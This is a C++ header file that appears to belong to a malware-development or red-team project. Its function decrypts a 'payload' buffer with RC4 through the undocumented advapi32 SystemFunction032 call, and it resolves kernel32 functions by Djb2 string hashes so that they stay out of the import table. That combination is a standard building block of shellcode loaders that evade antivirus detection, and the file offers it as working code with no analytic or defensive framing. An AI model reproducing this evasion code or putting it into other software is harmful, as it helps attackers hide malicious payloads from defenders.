#pragma once
#include "Compiler.h"

// USTRING structure definition
struct USTRING {
    DWORD Length;
    DWORD MaximumLength;
    PVOID Buffer;

    // Constructor for C++ initialization
    USTRING() : Length(0), MaximumLength(0), Buffer(nullptr) {}

    // Constructor with parameters
    USTRING(PVOID buffer, DWORD length) :
        Buffer(buffer),
        Length(length),
        MaximumLength(length) {
    }
};

// Using alias instead of typedef for the function pointer
using fnSystemFunction032 = NTSTATUS(NTAPI*)(USTRING* Img, USTRING* Key);

// Modern C++ function declaration
BOOL Rc4EncryptionViaSystemFunc032(const PBYTE pRc4Key, PBYTE pPayloadData, const DWORD dwRc4KeySize, const DWORD sPayloadSize) {
    // Initialize STATUS to 0 instead of NULL
    NTSTATUS STATUS = 0;

    // Create USTRING objects using constructors
    USTRING Key(pRc4Key, dwRc4KeySize);
    USTRING Img(pPayloadData, sPayloadSize);

    // Get kernel32.dll handle
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32) {
        printf("[!] Failed to get kernel32.dll handle\n");
        return FALSE;
    }

    // Resolve function pointers using direct hash values
    fnLoadLibraryA pLoadLibraryA = (fnLoadLibraryA)GetProcAddressH(hKernel32, HashStringDjb2A("LoadLibraryA"));
    fnGetProcAddress pGetProcAddress = (fnGetProcAddress)GetProcAddressH(hKernel32, HashStringDjb2A("GetProcAddress"));
    fnFreeLibrary pFreeLibrary = (fnFreeLibrary)GetProcAddressH(hKernel32, HashStringDjb2A("FreeLibrary"));
    fnGetLastError pGetLastError = (fnGetLastError)GetProcAddressH(hKernel32, HashStringDjb2A("GetLastError"));

    if (!pLoadLibraryA || !pGetProcAddress || !pFreeLibrary || !pGetLastError) {
        printf("[!] Failed to resolve one or more API functions\n");
        return FALSE;
    }

    // Load the DLL using resolved LoadLibraryA
    HMODULE hAdvapi32 = pLoadLibraryA("Advapi32");
    if (!hAdvapi32) {
        printf("[!] Failed to load Advapi32.dll. Error: %d\n", pGetLastError());
        return FALSE;
    }

    // Get the procedure address using resolved GetProcAddress
    auto SystemFunction032 = reinterpret_cast<fnSystemFunction032>(
        pGetProcAddress(hAdvapi32, "SystemFunction032")
        );

    if (!SystemFunction032) {
        printf("[!] Failed to get SystemFunction032 address. Error: %d\n", pGetLastError());
        pFreeLibrary(hAdvapi32);
        return FALSE;
    }

    // Call SystemFunction032 and check result
    STATUS = SystemFunction032(&Img, &Key);

    // Free the library using resolved FreeLibrary
    pFreeLibrary(hAdvapi32);

    if (STATUS != 0x0) {
        printf("[!] SystemFunction032 FAILED With Error: 0x%0.8X\n", STATUS);
        return FALSE;
    }

    return TRUE;
}
